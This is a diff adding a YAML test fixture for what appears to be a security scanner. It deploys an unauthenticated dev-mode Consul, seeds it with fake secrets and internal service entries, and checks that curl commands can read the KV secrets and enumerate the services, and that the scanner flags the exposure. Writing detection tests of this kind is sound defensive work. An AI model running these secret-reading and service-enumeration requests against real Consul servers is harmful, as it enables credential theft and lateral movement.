@@ -1,0 +1,75 @@
+name: chain-consul-service-discovery
+description: >
+  Exploit chain: unauthenticated Consul → service catalog discovery →
+  KV store secret extraction → internal network topology mapping.
+  Consul dev mode exposes full API without ACLs, allowing an attacker to
+  enumerate all registered services, read KV secrets, and map the internal
+  network topology for lateral movement.
+tags: [chain, postexploit, consul, service-discovery, authorized]
+
+services:
+  consul:
+    image: hashicorp/consul:1.18
+    ports: ["0:8500"]
+    command: ["agent", "-dev", "-client", "0.0.0.0"]
+
+  seed:
+    image: hashicorp/consul:1.18
+    depends_on: [consul]
+    restart: "no"
+    entrypoint: ["sh", "-c"]
+    command:
+      - |
+        sleep 3
+        consul kv put -http-addr=http://consul:8500 secrets/database/password 'RootDBPassword!456'
+        consul kv put -http-addr=http://consul:8500 secrets/api/token 'tok-abc123-prod-secret'
+        consul kv put -http-addr=http://consul:8500 config/database/host '10.0.1.50:5432'
+        consul kv put -http-addr=http://consul:8500 config/redis/host '10.0.1.51:6379'
+        curl -sf -X PUT http://consul:8500/v1/agent/service/register -d '{"Name":"postgres","Port":5432,"Address":"10.0.1.50"}'
+        curl -sf -X PUT http://consul:8500/v1/agent/service/register -d '{"Name":"redis","Port":6379,"Address":"10.0.1.51"}'
+        curl -sf -X PUT http://consul:8500/v1/agent/service/register -d '{"Name":"api-gateway","Port":8080,"Address":"10.0.1.10"}'
+
+ready:
+  cmd: "curl -sf http://localhost:${fixture.consul.port}/v1/status/leader | grep -q '\"'"
+  timeout: 30s
+  interval: 2s
+
+assertions:
+  # Verify exploit works
+  - name: exploit-kv-secrets-readable
+    type: command
+    expect:
+      command: "curl -sf http://localhost:${fixture.consul.port}/v1/kv/secrets/database/password?raw | grep -q RootDBPassword"
+      exit_code: 0
+
+  - name: exploit-services-enumerable
+    type: command
+    expect:
+      command: "curl -sf http://localhost:${fixture.consul.port}/v1/catalog/services | grep -q postgres"
+      exit_code: 0
+
+  # Beacon detection
+  - name: detects-consul-no-acl
+    type: beacon
+    target: "localhost:${fixture.consul.port}"
+    args: ["--no-enrich", "--scanners", "portscan", "--ports", "${fixture.consul.port}"]
+    expect:
+      check_id: port.consul_no_acl
+
+  # Post-exploit chain: credential harvest from KV store
+  - name: chain-harvests-kv-credentials
+    type: beacon
+    target: "localhost:${fixture.consul.port}"
+    args: ["--no-enrich", "--authorized", "--ports", "${fixture.consul.port}"]
+    expect:
+      check_id: exploit.credential_harvest
+
+  # Post-exploit chain: internal network discovered via service catalog
+  - name: chain-discovers-internal-network
+    type: beacon
+    target: "localhost:${fixture.consul.port}"
+    args: ["--no-enrich", "--authorized", "--ports", "${fixture.consul.port}"]
+    expect:
+      check_id: exploit.internal_network_discovered
+
+timeout: 5m
